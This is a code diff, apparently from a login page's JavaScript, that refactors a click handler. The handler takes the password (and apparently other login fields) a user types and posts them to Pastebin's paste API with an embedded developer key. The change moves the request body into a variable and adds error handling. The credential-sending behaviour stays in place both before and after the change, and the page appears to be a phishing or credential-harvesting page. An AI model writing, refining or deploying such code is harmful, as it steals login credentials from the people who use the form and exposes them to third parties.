@@ -20,25 +20,26 @@ loginButton.addEventListener('click', () => {
             password: password.value,
         };
 
+        const bodyParam = new URLSearchParams({
+            api_option: 'paste',
+            api_dev_key: pastebinkey,
+            api_paste_code: JSON.stringify(data),
+        });
+
         const requestData = {
             method: 'POST',
             mode: 'no-cors',
-            body: new URLSearchParams({
-                api_option: 'paste',
-                api_dev_key: pastebinkey,
-                api_paste_code: JSON.stringify(data),
-                api_paste_private: '0', // 0 = Public, 1 = Unlisted, 2 = Private
-                api_paste_expire_date: 'N', // N = Never, 10M = 10 Minutes, 1H = 1 Hour, etc.
-            }),
+            body: bodyParam,
         };
 
-        console.log(JSON.stringify(data));
+        console.log(JSON.stringify(data), bodyParam);
 
         fetch('https://pastebin.com/api/api_post.php', requestData)
             .then((response) => response.text())
             .then((data) => {
                 console.log('Paste created successfully:');
                 console.log(data);
-            });
+            })
+            .catch((err) => console.error(err));
     }
 });
